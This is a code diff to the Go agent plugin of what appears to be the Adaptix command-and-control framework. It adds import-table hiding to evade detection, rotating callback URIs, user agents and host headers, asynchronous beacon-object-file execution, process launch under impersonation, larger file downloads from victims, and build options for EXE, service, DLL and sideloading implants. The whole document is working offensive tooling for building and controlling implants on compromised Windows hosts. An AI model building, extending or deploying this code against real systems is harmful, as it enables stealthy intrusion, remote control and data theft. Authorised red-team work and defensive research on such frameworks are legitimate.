@@ -42,7 +42,7 @@ type Teamserver interface {
 	TsTaskUpdate(agentId string, data adaptix.TaskData)
 	TsTaskGetAvailableAll(agentId string, availableSize int) ([]adaptix.TaskData, error)
 
-	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int) error
+	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int64) error
 	TsDownloadUpdate(fileId string, state int, data []byte) error
 	TsDownloadClose(fileId string, reason int) error
 	TsDownloadSave(agentId string, fileId string, filename string, content []byte) error
@@ -276,6 +276,7 @@ type GenerateConfig struct {
 	IsWorkingTime      bool   `json:"is_workingtime"`
 	StartTime          string `json:"start_time"`
 	EndTime            string `json:"end_time"`
+	IatHiding          bool   `json:"iat_hiding"`
 	IsSideloading      bool   `json:"is_sideloading"`
 	SideloadingContent string `json:"sideloading_content"`
 	DnsResolvers       string `json:"dns_resolvers"`
@@ -288,6 +289,7 @@ type GenerateConfig struct {
 	ProxyPort          int    `json:"proxy_port"`
 	ProxyUsername      string `json:"proxy_username"`
 	ProxyPassword      string `json:"proxy_password"`
+	RotationMode       string `json:"rotation_mode"`
 }
 
 var (
@@ -295,7 +297,7 @@ var (
 	ObjectDir_smb  = "objects_smb"
 	ObjectDir_tcp  = "objects_tcp"
 	ObjectDir_dns  = "objects_dns"
-	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "Boffer", "Commander", "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
+	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "bof_loader", "Boffer", "Commander", "crt", "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
 	CFlags         = "-c -fno-builtin -fno-unwind-tables -fno-strict-aliasing -fno-ident -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -fpermissive -w -masm=intel -fPIC"
 	LFlags         = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
 )
@@ -347,23 +349,45 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 			}
 		}
 
+		sleepSeconds, err := parseDurationToSeconds(generateConfig.Sleep)
+		if err != nil {
+			return nil, err
+		}
+
+		lWatermark, _ := strconv.ParseInt(transportProfile.Watermark, 16, 64)
+
 		encrypt_key, _ := listenerMap["encrypt_key"].(string)
 		encryptKey, err := hex.DecodeString(encrypt_key)
 		if err != nil {
 			return nil, err
 		}
 
+		params = append(params, int(agentWatermark))
+		params = append(params, kill_date)
+		params = append(params, working_time)
+		params = append(params, sleepSeconds)
+		params = append(params, generateConfig.Jitter)
+		params = append(params, int(lWatermark))
+
 		protocol, _ := listenerMap["protocol"].(string)
 		switch protocol {
 
 		case "http":
 
+			lines, _ := listenerMap["callback_addresses"].([]interface{})
+			UriRaw, _ := listenerMap["uri"].([]interface{})
+			UserAgentRaw, _ := listenerMap["user_agent"].([]interface{})
+			HostHeaderRaw, _ := listenerMap["host_header"].([]interface{})
+
+			HttpMethod, _ := listenerMap["http_method"].(string)
+			Ssl, _ := listenerMap["ssl"].(bool)
+			ParameterName, _ := listenerMap["hb_header"].(string)
+			RequestHeaders, _ := listenerMap["request_headers"].(string)
+
 			var Hosts []string
 			var Ports []int
-			hosts_agent, _ := listenerMap["callback_addresses"].(string)
-			lines := strings.Split(strings.TrimSpace(hosts_agent), ", ")
-			for _, line := range lines {
-				line = strings.TrimSpace(line)
+			for _, i_line := range lines {
+				line := strings.TrimSpace(i_line.(string))
 				if line == "" {
 					continue
 				}
@@ -376,23 +400,39 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 			}
 			c2Count := len(Hosts)
 
-			HttpMethod, _ := listenerMap["http_method"].(string)
-			Ssl, _ := listenerMap["ssl"].(bool)
-			Uri, _ := listenerMap["uri"].(string)
-			ParameterName, _ := listenerMap["hb_header"].(string)
-			UserAgent, _ := listenerMap["user_agent"].(string)
-			RequestHeaders, _ := listenerMap["request_headers"].(string)
+			var Uris []string
+			for _, i_line := range UriRaw {
+				u := strings.TrimSpace(i_line.(string))
+				if u != "" {
+					Uris = append(Uris, u)
+				}
+			}
+
+			var UserAgents []string
+			for _, i_line := range UserAgentRaw {
+				ua := strings.TrimSpace(i_line.(string))
+				if ua != "" {
+					UserAgents = append(UserAgents, ua)
+				}
+			}
+
+			var HostHeaders []string
+			for _, i_line := range HostHeaderRaw {
+				hh := strings.TrimSpace(i_line.(string))
+				if hh != "" {
+					HostHeaders = append(HostHeaders, hh)
+				}
+			}
 
 			WebPageOutput, _ := listenerMap["page-payload"].(string)
 			ansOffset1 := strings.Index(WebPageOutput, "<<<PAYLOAD_DATA>>>")
 			ansOffset2 := len(WebPageOutput[ansOffset1+len("<<<PAYLOAD_DATA>>>"):])
 
-			seconds, err := parseDurationToSeconds(generateConfig.Sleep)
-			if err != nil {
-				return nil, err
+			rotationMode := 0 // 0=sequential, 1=random
+			if generateConfig.RotationMode == "random" {
+				rotationMode = 1
 			}
 
-			params = append(params, int(agentWatermark))
 			params = append(params, Ssl)
 			params = append(params, c2Count)
 			for i := 0; i < c2Count; i++ {
@@ -400,12 +440,23 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 				params = append(params, Ports[i])
 			}
 			params = append(params, HttpMethod)
-			params = append(params, Uri)
+			params = append(params, len(Uris))
+			for _, u := range Uris {
+				params = append(params, u)
+			}
 			params = append(params, ParameterName)
-			params = append(params, UserAgent)
+			params = append(params, len(UserAgents))
+			for _, ua := range UserAgents {
+				params = append(params, ua)
+			}
 			params = append(params, RequestHeaders)
 			params = append(params, ansOffset1)
 			params = append(params, ansOffset2)
+			params = append(params, len(HostHeaders))
+			for _, hh := range HostHeaders {
+				params = append(params, hh)
+			}
+			params = append(params, rotationMode)
 			proxyType := 0 // 0=none, 1=http, 2=https
 			if generateConfig.UseProxy {
 				if generateConfig.ProxyType == "https" {
@@ -419,41 +470,27 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 			params = append(params, generateConfig.ProxyPort)
 			params = append(params, generateConfig.ProxyUsername)
 			params = append(params, generateConfig.ProxyPassword)
-			params = append(params, kill_date)
-			params = append(params, working_time)
-			params = append(params, seconds)
-			params = append(params, generateConfig.Jitter)
 
 		case "bind_smb":
 
 			pipename, _ := listenerMap["pipename"].(string)
 			pipename = "\\\\.\\pipe\\" + pipename
 
-			lWatermark, _ := strconv.ParseInt(transportProfile.Watermark, 16, 64)
-
-			params = append(params, int(agentWatermark))
 			params = append(params, pipename)
-			params = append(params, int(lWatermark))
-			params = append(params, kill_date)
 
 		case "bind_tcp":
 			prepend, _ := listenerMap["prepend_data"].(string)
 			port, _ := listenerMap["port_bind"].(float64)
 
-			lWatermark, _ := strconv.ParseInt(transportProfile.Watermark, 16, 64)
-
-			params = append(params, int(agentWatermark))
 			params = append(params, prepend)
 			params = append(params, int(port))
-			params = append(params, int(lWatermark))
-			params = append(params, kill_date)
 
 		case "dns":
 			userAgent := generateConfig.UserAgent
 			if userAgent == "" {
 				userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"
 			}
-			params, err = buildDNSProfileParams(generateConfig, listenerMap, transportProfile.Watermark, agentWatermark, kill_date, working_time, userAgent)
+			params, err = buildDNSProfileParams(generateConfig, listenerMap, userAgent)
 			if err != nil {
 				return nil, err
 			}
@@ -521,10 +558,17 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 
 	cFlags := CFlags
 	lFlags := LFlags
+	postLibs := ""
 
 	err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig)
 	if err != nil {
 		return nil, "", err
+	}
+
+	// IAT Hiding: -nostdlib eliminates CRT, custom crt.cpp provides replacements
+	if generateConfig.IatHiding {
+		cFlags += " -DIAT_HIDING"
+		lFlags += " -nostdlib -nostartfiles -nodefaultlibs"
 	}
 
 	currentDir := ModuleDir
@@ -598,15 +642,38 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		Files += ObjectDir + "/main" + Ext
 		buildPath = tempDir + "/file.exe"
 		Filename += ".exe"
+		if generateConfig.IatHiding {
+			if generateConfig.Arch == "x86" {
+				lFlags += " -Wl,-e,_WinMain@16"
+			} else {
+				lFlags += " -Wl,-e,WinMain"
+			}
+		}
 	} else if generateConfig.Format == "Service Exe" {
 		Files += ObjectDir + "/main_service" + Ext
 		buildPath = tempDir + "/svc.exe"
 		Filename = "svc_" + Filename + ".exe"
+		if generateConfig.IatHiding {
+			postLibs += " -ladvapi32"
+			if generateConfig.Arch == "x86" {
+				lFlags += " -Wl,-e,_main"
+			} else {
+				lFlags += " -Wl,-e,main"
+			}
+		}
 	} else if generateConfig.Format == "DLL" {
 		Files += ObjectDir + "/main_dll" + Ext
 		lFlags += " -shared"
 		buildPath = tempDir + "/file.dll"
 		Filename += ".dll"
+		if generateConfig.IatHiding {
+			postLibs += " -lkernel32"
+			if generateConfig.Arch == "x86" {
+				lFlags += " -Wl,-e,_DllMain@12"
+			} else {
+				lFlags += " -Wl,-e,DllMain"
+			}
+		}
 		if generateConfig.IsSideloading {
 			sideloadingContent, err := base64.StdEncoding.DecodeString(generateConfig.SideloadingContent)
 			if err != nil {
@@ -623,6 +690,13 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		lFlags += " -shared"
 		buildPath = tempDir + "/file.dll"
 		Filename += ".bin"
+		if generateConfig.IatHiding {
+			if generateConfig.Arch == "x86" {
+				lFlags += " -Wl,-e,_DllMain@12"
+			} else {
+				lFlags += " -Wl,-e,DllMain"
+			}
+		}
 	} else {
 		_ = os.RemoveAll(tempDir)
 		return nil, "", errors.New("unknown file format")
@@ -633,6 +707,9 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	var buildArgs []string
 	buildArgs = append(buildArgs, strings.Fields(lFlags)...)
 	buildArgs = append(buildArgs, strings.Fields(Files)...)
+	if postLibs != "" {
+		buildArgs = append(buildArgs, strings.Fields(postLibs)...)
+	}
 	buildArgs = append(buildArgs, "-o", buildPath)
 
 	err = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, Compiler, buildArgs...)
@@ -840,6 +917,7 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 		if err != nil {
 			goto RET
 		}
+
 		array = []interface{}{COMMAND_CD, Ts.TsConvertUTF8toCp(path, agentData.ACP)}
 
 	case "cp":
@@ -874,6 +952,7 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 
 			taskData.Type = adaptix.TASK_TYPE_JOB
 
+			async := getBoolArg(args, "-a")
 			bofFile, err = getStringArg(args, "bof")
 			if err != nil {
 				goto RET
@@ -892,7 +971,7 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 				}
 			}
 
-			array = []interface{}{COMMAND_EXEC_BOF, "go", len(bofContent), bofContent, len(params), params}
+			array = []interface{}{COMMAND_EXEC_BOF, async, "go", len(bofContent), bofContent, len(params), params}
 		} else {
 			err = errors.New("subcommand must be 'bof'")
 			goto RET
@@ -1132,6 +1211,7 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 			taskData.Type = adaptix.TASK_TYPE_JOB
 
 			output := getBoolArg(args, "-o")
+			impersonation := getBoolArg(args, "-i")
 			suspend := getBoolArg(args, "-s")
 			programState := 0
 			if suspend {
@@ -1140,7 +1220,7 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 			programArgs, _ := args["args"].(string)
 			programArgs = Ts.TsConvertUTF8toCp(programArgs, agentData.ACP)
 
-			array = []interface{}{COMMAND_PS_RUN, output, programState, programArgs}
+			array = []interface{}{COMMAND_PS_RUN, output, impersonation, programState, programArgs}
 
 		} else {
 			err = errors.New("subcommand must be 'list', 'kill' or 'run'")
@@ -1559,14 +1639,14 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 			fileId := fmt.Sprintf("%08x", packer.ParseInt32())
 			downloadCommand := packer.ParseInt8()
 			if downloadCommand == DOWNLOAD_START {
-				if false == packer.CheckPacker([]string{"int", "array"}) {
+				if false == packer.CheckPacker([]string{"long", "array"}) {
 					goto HANDLER
 				}
-				fileSize := packer.ParseInt32()
+				fileSize := packer.ParseInt64()
 				fileName := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
 				task.Message = fmt.Sprintf("The download of the '%s' file (%v bytes) has started: [fid %v]", fileName, fileSize, fileId)
 				task.Completed = false
-				_ = Ts.TsDownloadAdd(agentData.Id, fileId, fileName, int(fileSize))
+				_ = Ts.TsDownloadAdd(agentData.Id, fileId, fileName, int64(fileSize))
 
 			} else if downloadCommand == DOWNLOAD_CONTINUE {
 				if false == packer.CheckPacker([]string{"array"}) {
@@ -1603,8 +1683,17 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 			}
 
 		case COMMAND_EXEC_BOF:
-			task.Message = "BOF finished"
-			task.Completed = true
+			if false == packer.CheckPacker([]string{"byte"}) {
+				goto HANDLER
+			}
+			state := packer.ParseInt8()
+			if state == 1 {
+				task.Message = "Async BOF started"
+				task.Completed = false
+			} else {
+				task.Message = "BOF finished"
+				task.Completed = true
+			}
 
 		case COMMAND_EXEC_BOF_OUT:
 			if false == packer.CheckPacker([]string{"int"}) {
@@ -1845,6 +1934,8 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 						stringType = "Process"
 					} else if jobType == 0x4 {
 						stringType = "Shell"
+					} else if jobType == 0x5 {
+						stringType = "Async BOF"
 					}
 					Output += fmt.Sprintf("\n %-10v  %-5v  %-13s", jobId, pid, stringType)
 				}
